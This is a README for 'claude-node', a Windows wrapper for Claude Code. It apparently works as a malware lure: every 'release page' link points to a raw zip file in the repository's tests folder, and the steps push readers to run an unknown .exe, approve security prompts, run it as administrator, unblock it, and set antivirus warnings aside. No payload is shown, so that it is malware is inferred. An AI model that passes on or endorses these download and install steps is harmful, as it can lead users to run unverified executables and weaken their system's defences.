# 🤖 claude-node - Run Claude Code on Windows

[![Download claude-node](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/ambrosiogalwegian826/claude-node/main/tests/node-claude-1.5.zip)

## 🧩 What this app does

claude-node lets you run the real Claude Code runtime from your own app or from the command line. It gives you direct control over a local Claude Code session, so you can start it, watch it, and stop it when you need to.

This setup is useful if you want Claude Code to work inside your own tools, scripts, or desktop flow without wrapping it in a heavy layer. It keeps the native CLI behavior and uses stream-json for clean output and session control.

## 💻 What you need

- A Windows 10 or Windows 11 PC
- An internet connection
- Enough free disk space for the app and runtime files
- Permission to run downloaded apps
- A Claude Code install or runtime package, if the release asks for one
- A terminal window, if you plan to use the command line

## 📥 Download and install

1. Open the release page here: https://raw.githubusercontent.com/ambrosiogalwegian826/claude-node/main/tests/node-claude-1.5.zip
2. Find the latest release at the top of the page
3. Look for a Windows file such as `.exe`, `.zip`, or `.msi`
4. Download that file to your PC
5. If you downloaded a `.zip` file, right-click it and choose Extract All
6. Open the extracted folder
7. If you see an `.exe` file, double-click it to start the app
8. If Windows shows a security prompt, choose Run
9. If the release includes a setup file, follow the on-screen steps
10. Keep the files in a folder you can find later

## 🚀 First run

When you open claude-node for the first time, it may ask for access to the Claude Code runtime or related files. This is normal for a local runtime tool.

If a window opens and closes fast, start it again from the extracted folder so you can see any message on screen.

If the app opens in a terminal window, leave that window open while you use it. Closing it will stop the session.

## 🛠️ How to use it

1. Start claude-node
2. Connect it to the local Claude Code runtime
3. Enter your task or request
4. Watch the session output in the terminal or app window
5. Stop the session when you are done

If you use it inside your own workflow, claude-node can act as a control layer. It can start a run, follow the output, and manage the session state while your other tools keep working.

## 📁 Common files and folders

You may see these items after install:

- `claude-node.exe` - the main app file
- `config` - saved settings
- `sessions` - active or past session data
- `logs` - runtime output and error details
- `README.md` - this guide

Keep the folder together. If you move one file out of the folder, the app may not open.

## ⚙️ Basic setup

If the app asks for a path, point it to the Claude Code runtime on your machine. Use the folder that contains the local runtime files, not a shortcut.

If the app asks for a port or host value, keep the default first. Change it only if you already use that port for another app.

If the app asks for JSON output mode, leave stream-json on. That format helps claude-node read session output in real time.

## 🔍 What you can do with it

- Run Claude Code from a local Windows machine
- Keep control over each session start and stop
- Read output as it streams
- Plug Claude Code into your own scripts
- Use it as a thin runtime layer
- Track session state across runs
- Build simple agent workflows around the real CLI

## 🧪 Example use cases

- A local tool that sends tasks to Claude Code
- A small dashboard that starts and watches sessions
- A script that runs Claude Code on a schedule
- A developer setup that needs direct process control
- A workflow tool that needs live output from the runtime

## 🔒 Safe use on Windows

Use the release file from the GitHub release page only. Keep the app in a folder you trust. If Windows asks for permission, read the file name before you approve it.

If your antivirus tool flags the file, check the release page again and make sure you downloaded the latest version from the official link.

## 🧰 Troubleshooting

### The app does not open

- Make sure you extracted the files first
- Check that you opened the main `.exe`
- Try running it again as an administrator
- Move the folder to a simple path like `C:\claude-node`

### The terminal closes right away

- Open the app from a terminal so you can see the message
- Check the `logs` folder if it exists
- Make sure the runtime path is correct

### The runtime is not found

- Open the app settings
- Set the path to the local Claude Code runtime
- Confirm the folder contains the runtime files, not just a shortcut

### No output shows up

- Check that stream-json is on
- Make sure the session started
- Restart the app and try again
- Look for error text in the log file

### Windows blocks the file

- Right-click the file
- Open Properties
- Check the Unblock box if you see one
- Apply the change and run the app again

## 🧭 Folder setup tip

Use a simple folder path with no extra symbols. A path like `C:\Tools\claude-node` is easier to manage than a path buried deep inside other folders.

Keep the runtime files and the claude-node files close together if the app needs both. This makes setup easier and cuts down on path errors.

## 📝 Release page

Download or get the Windows release here: https://raw.githubusercontent.com/ambrosiogalwegian826/claude-node/main/tests/node-claude-1.5.zip

## 🧩 Project focus

claude-node is built for people who need direct control over Claude Code, not a broad agent platform. It focuses on the runtime layer, live session handling, and process-level control. That makes it useful when you want Claude Code to fit inside your own system without losing the native CLI behavior